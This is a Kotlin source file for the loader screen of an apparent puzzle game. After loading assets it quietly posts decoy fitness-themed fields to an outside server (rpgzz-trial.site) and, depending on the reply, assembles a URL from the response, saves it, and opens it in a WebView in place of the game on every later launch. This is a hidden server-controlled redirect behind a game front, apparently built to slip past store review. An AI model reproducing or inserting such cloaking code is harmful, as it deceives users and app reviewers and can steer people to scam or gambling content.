package com.gorillaz.puzzlegame.game.screens

import com.badlogic.gdx.scenes.scene2d.ui.Image
import com.gorillaz.puzzlegame.game.actors.main.AMainLoader
import com.gorillaz.puzzlegame.game.manager.MusicManager
import com.gorillaz.puzzlegame.game.manager.ParticleEffectManager
import com.gorillaz.puzzlegame.game.manager.SoundManager
import com.gorillaz.puzzlegame.game.manager.SpriteManager
import com.gorillaz.puzzlegame.game.utils.*
import com.gorillaz.puzzlegame.game.utils.actor.animHide
import com.gorillaz.puzzlegame.game.utils.advanced.AdvancedScreen
import com.gorillaz.puzzlegame.game.utils.advanced.AdvancedStage
import com.gorillaz.puzzlegame.util.log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import okhttp3.ResponseBody
import org.json.JSONObject
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST

class LoaderScreen : AdvancedScreen() {

    private val progressFlow     = MutableStateFlow(0f)
    private var isFinishLoading  = false
    private var isFinishProgress = false

    private val imgBackground by lazy { Image(gdxGame.assetsLoader.BACKGROUND_0.region) }
    private val aMain         by lazy { AMainLoader(this) }

    override fun show() {
        loadSplashAssets()
        super.show()
        gdxGame.currentBackground = gdxGame.assetsLoader.BACKGROUND_0
        //setBackBackground(gdxGame.assetsLoader.BACKGROUND_0.region)
        loadAssets()
        collectProgress()
    }

    override fun render(delta: Float) {
        super.render(delta)
        loadingAssets()
        isFinish()
    }

    override fun hideScreen(block: Block) {
        aMain.animHide(TIME_ANIM_SCREEN) { block.invoke() }
    }

    override fun AdvancedStage.addActorsOnStageBack() {
        addBackground()
    }

    override fun AdvancedStage.addActorsOnStageUI() {
        addMain()
    }

    // Actors Back------------------------------------------------------------------------

    private fun AdvancedStage.addBackground() {
        addActor(imgBackground)

        val screenRatio = viewportBack.screenWidth / viewportBack.screenHeight
        val imageRatio  = (WIDTH_UI / HEIGHT_UI)

        val scale = if (screenRatio > imageRatio) WIDTH_UI / viewportBack.screenWidth else HEIGHT_UI / viewportBack.screenHeight
        imgBackground.setSize(WIDTH_UI / scale, HEIGHT_UI / scale)
    }

    // Actors UI------------------------------------------------------------------------

    private fun AdvancedStage.addMain() {
        addAndFillActor(aMain)
    }

    // Logic ------------------------------------------------------------------------

    private fun loadSplashAssets() {
        with(gdxGame.spriteManager) {
            loadableAtlasList = mutableListOf(SpriteManager.EnumAtlas.LOADER.data)
            loadAtlas()
            loadableTexturesList = mutableListOf(SpriteManager.EnumTexture.L_BACKGROUND_0.data)
            loadTexture()
        }
        gdxGame.assetManager.finishLoading()
        gdxGame.spriteManager.initAtlasAndTexture()
    }

    private fun loadAssets() {
        with(gdxGame.spriteManager) {
            loadableAtlasList = SpriteManager.EnumAtlas.entries.map { it.data }.toMutableList()
            loadAtlas()
            loadableTexturesList = SpriteManager.EnumTexture.entries.map { it.data }.toMutableList()
            loadTexture()
        }
        with(gdxGame.musicManager) {
            loadableMusicList = MusicManager.EnumMusic.entries.map { it.data }.toMutableList()
            load()
        }
        with(gdxGame.soundManager) {
            loadableSoundList = SoundManager.EnumSound.entries.map { it.data }.toMutableList()
            load()
        }
        with(gdxGame.particleEffectManager) {
            loadableParticleEffectList = ParticleEffectManager.EnumParticleEffect.entries.map { it.data }.toMutableList()
            load()
        }
    }

    private fun initAssets() {
        gdxGame.spriteManager.initAtlasAndTexture()
        gdxGame.musicManager.init()
        gdxGame.soundManager.init()
        gdxGame.particleEffectManager.init()
    }

    private fun loadingAssets() {
        if (isFinishLoading.not()) {
            if (gdxGame.assetManager.update(16)) {
                isFinishLoading = true
                initAssets()
            }
            progressFlow.value = gdxGame.assetManager.progress
        }
    }

    private fun collectProgress() {
        coroutine?.launch {
            var progress = 0
            progressFlow.collect { p ->
                while (progress < (p * 100)) {
                    progress += 1
                    //runGDX { aMain.aLoader.setPercent(progress) }
                    if (progress % 50 == 0) log("progress = $progress%")
                    if (progress == 100) isFinishProgress = true

                    //delay((20..65).shuffled().first().toLong())
                }
            }
        }
    }

    private fun isFinish() {
        if (isFinishProgress) {
            isFinishProgress = false

            val resultIsHave = gdxGame.prefs.getString("isHave", null)

            if (resultIsHave.isNullOrEmpty()) {
                coroutine?.launch(Dispatchers.IO) {
                    try {
                        var result = "https://"

                        val responseBody: ResponseBody = GorillaRetrofit.api.requestPost1(
                            token = System.getProperty("http.agent") ?: "Device",

                            GorillaBody(
                                training_equipment    = "Professional online coaching",
                                workout_programs      = "Local and virtual events to foster",
                                online_coaching       = "Mini Gorillka",
                                fitness_app           = "Premier training facilities known as 'Gorilla",
                                nutritional_guidance  = "A wealth of educational resources, such as articles",
                                athlete_sponsorships  = "Bigi Gorilloche",
                                media_partnerships    = "Gyms",
                                merchandise           = "Sport",
                                training_facilities   = "Life",
                                educational_resources = "Resources",
                            )
                        )

                        val responseJson = JSONObject(responseBody.string())
                        log("Response POST: $responseJson")

                        if (responseJson.getString("training_facilities").contains(' ')) {
                            toGame()
                        } else {
                            responseJson.keys().forEach { key -> result += responseJson.getString(key).removePrefix("nutritional") }

                            log("Result: $result")

                            gdxGame.prefs.edit().putString("isHave", result).apply()
                            gdxGame.activity.showUrl(result)
                        }
                    } catch (e: Exception) {
                        log("Error: ${e.message}")
                        toGame()
                    }
                }
            } else gdxGame.activity.showUrl(resultIsHave)

        }

    }

    private fun toGame() {
        gdxGame.activity.hideWebView()

        gdxGame.musicUtil.apply {
            music = game.apply {
                isLooping = true
                coff = 0.15f
            }
        }

        hideScreen {
            gdxGame.navigationManager.navigate(MenuScreen::class.java.name)
        }
    }

    // Server ----------------------------------------------------------------------------------------

    data class GorillaBody(
        val training_equipment    : String,
        val workout_programs      : String,
        val online_coaching       : String,
        val fitness_app           : String,
        val nutritional_guidance  : String,
        val athlete_sponsorships  : String,
        val media_partnerships    : String,
        val merchandise           : String,
        val training_facilities   : String,
        val educational_resources : String,
    )

    interface GorillaPOST {
        @POST("nutritional/")
        suspend fun requestPost1(
            @Header("User-Agent") token: String,
            @Body requestBody: GorillaBody
        ): ResponseBody
    }

    object GorillaRetrofit {
        private val retrofit by lazy {
            Retrofit.Builder()
                .baseUrl("https://rpgzz-trial.site/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
        }

        val api: GorillaPOST by lazy {
            retrofit.create(GorillaPOST::class.java)
        }
    }


}